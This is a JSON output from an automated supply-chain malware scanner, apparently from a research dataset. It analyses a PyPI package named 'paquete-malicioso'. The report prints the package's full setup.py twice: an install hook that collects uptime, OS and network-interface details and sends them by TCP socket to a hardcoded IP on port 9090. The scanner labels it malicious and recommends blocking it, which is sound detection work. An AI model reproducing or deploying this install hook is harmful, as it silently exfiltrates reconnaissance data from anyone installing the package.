{
  "package_path": "Dataset/study/unzip_malware/paquete-malicioso-99.99.99",
  "package_manager": "pypi",
  "analysis_timestamp": "2025-12-19T01:23:04.329037",
  "total_files_found": 1,
  "total_files_analyzed": 1,
  "high_priority_files": 1,
  "file_results": [
    {
      "file_path": "Dataset/study/unzip_malware/paquete-malicioso-99.99.99/paquete-malicioso-99.99.99/setup.py",
      "file_type": ".py",
      "priority": "high",
      "slices": [
        {
          "code": "#!/usr/bin/env python\nimport urllib.request\nimport socket\nimport os\nimport pty\nimport platform\nimport psutil\nfrom datetime import datetime\nfrom setuptools import setup\nfrom setuptools.command.install import install\n\ndef createfile():\n    with open(\"/proc/uptime\", \"r\") as f:\n        uptime = f.read().split(\" \")[0].strip()\n\n    uptime = int(float(uptime))\n    uptime_hours = uptime // 3600\n    uptime_minutes = (uptime % 3600) // 60\n    uptime = (\"Uptime : \" + str(uptime_hours) + \":\" + str(uptime_minutes) + \" hours\")\n    systeminfo = (\"OS:\", platform.release(), \"SysName:\", platform.system(), \"OSVersion:\", platform.version(), \"Platform:\", platform.platform(), \"IPDetails:\", psutil.net_if_addrs())\n    sendable_string = f\"{uptime} --- {systeminfo}\"\n    clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    clientSocket.connect((\"134.209.85.64\",9090))\n    clientSocket.send(str(sendable_string).encode())\n\nclass PostInstallCommand(install):\n     def run(self):\n         createfile()\n         install.run(self)\n\nsetup(name='paquete-malicioso',\n      version='99.99.99',\n      description='Security project for PoC .',\n      author='zer0ul',\n      author_email='zer0ul@vulnium.com',\n      url='https://google.com',\n      packages=[],\n      cmdclass={\n         'install' :  PostInstallCommand,\n      },\n\n     )\n",
          "behavior_description": "During package installation, collects system uptime and OS/network information, then exfiltrates this data via a TCP connection to hardcoded IP 134.209.85.64:9090, enabling system reconnaissance and data theft.",
          "slice_id": "setup_slice_1",
          "file_path": "Dataset/study/unzip_malware/paquete-malicioso-99.99.99/paquete-malicioso-99.99.99/setup.py"
        }
      ],
      "slice_count": 1,
      "slice_analyses": [
        {
          "slice_id": "setup_slice_1",
          "slice_purpose": "",
          "code_snippet": "#!/usr/bin/env python\nimport urllib.request\nimport socket\nimport os\nimport pty\nimport platform\nimport psutil\nfrom datetime import datetime\nfrom setuptools import setup\nfrom setuptools.command.install import install\n\ndef createfile():\n    with open(\"/proc/uptime\", \"r\") as f:\n        uptime = f.read().split(\" \")[0].strip()\n\n    uptime = int(float(uptime))\n    uptime_hours = uptime // 3600\n    uptime_minutes = (uptime % 3600) // 60\n    uptime = (\"Uptime : \" + str(uptime_hours) + \":\" + str(uptime_minutes) + \" hours\")\n    systeminfo = (\"OS:\", platform.release(), \"SysName:\", platform.system(), \"OSVersion:\", platform.version(), \"Platform:\", platform.platform(), \"IPDetails:\", psutil.net_if_addrs())\n    sendable_string = f\"{uptime} --- {systeminfo}\"\n    clientSocket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)\n    clientSocket.connect((\"134.209.85.64\",9090))\n    clientSocket.send(str(sendable_string).encode())\n\nclass PostInstallCommand(install):\n     def run(self):\n         createfile()\n         install.run(self)\n\nsetup(name='paquete-malicioso',\n      version='99.99.99',\n      description='Security project for PoC .',\n      author='zer0ul',\n      author_email='zer0ul@vulnium.com',\n      url='https://google.com',\n      packages=[],\n      cmdclass={\n         'install' :  PostInstallCommand,\n      },\n\n     )\n",
          "api_sequence": [
            "open",
            "file.read",
            "platform.release",
            "platform.system",
            "platform.version",
            "platform.platform",
            "psutil.net_if_addrs",
            "socket.socket",
            "socket.connect",
            "str.encode",
            "socket.send",
            "setup"
          ],
          "action_sequence": [
            "basic_read_operations",
            "basic_read_operations",
            "get_os_release",
            "get_os_id",
            "get_os_version",
            "get_platform_info",
            "list_network_interfaces",
            "create_socket",
            "establish_tcp_connection",
            "encode_string_to_bytes",
            "send_socket_data",
            "configure_package_install"
          ],
          "object_sequence": [
            "system_uptime_file",
            "public_ip_port",
            "string_environment_data",
            "string_environment_data",
            "custom_directory"
          ],
          "intention_sequence": [
            "read_file_content",
            "read_file_content",
            "get_operating_system_name",
            "get_operating_system_name",
            "get_operating_system_version",
            "get_system_info",
            "collect_ip_address",
            "establish_connection",
            "connect_remote_server",
            "encode_string_to_bytes",
            "transmit_environment_data_server",
            "trigger_post_installation_logic"
          ],
          "is_malicious": true,
          "confidence": 0.95,
          "risk_level": "high",
          "matched_patterns": [
            [
              "get_os_release",
              "get_os_version",
              "create_socket",
              "establish_tcp_connection",
              "send_socket_data"
            ]
          ],
          "llm_reasoning": "",
          "explanation": "Matched pure malware-only pattern. Immediate classification as malicious.",
          "recommendation": "Block package"
        }
      ],
      "is_malicious": true,
      "max_confidence": 0.95,
      "max_risk_level": "high",
      "malicious_slice_count": 1,
      "analysis_time": 13.776429,
      "error": null
    }
  ],
  "is_package_malicious": true,
  "malicious_file_count": 1,
  "max_risk_level": "high",
  "total_analysis_time": 13.777112,
  "configuration": {
    "max_files": 500,
    "package_manager": "pypi",
    "detection_mode": "pattern_rag"
  }
}